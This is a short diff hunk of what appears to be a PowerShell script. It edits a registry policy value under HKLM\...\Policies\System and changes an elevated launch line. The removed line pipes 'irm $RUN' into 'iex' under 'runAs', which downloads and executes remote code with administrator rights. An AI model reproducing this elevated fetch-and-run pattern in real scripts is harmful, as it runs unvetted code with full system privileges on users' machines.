@@ -120,4 +120,4 @@ REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v Enable
 
 exit}
 
-Start-Process powershell -Verb runAs { irm $RUN | iex }
+Start-Process powershell -Verb runAs { Invoke-Command -ScriptBlock $RUN }
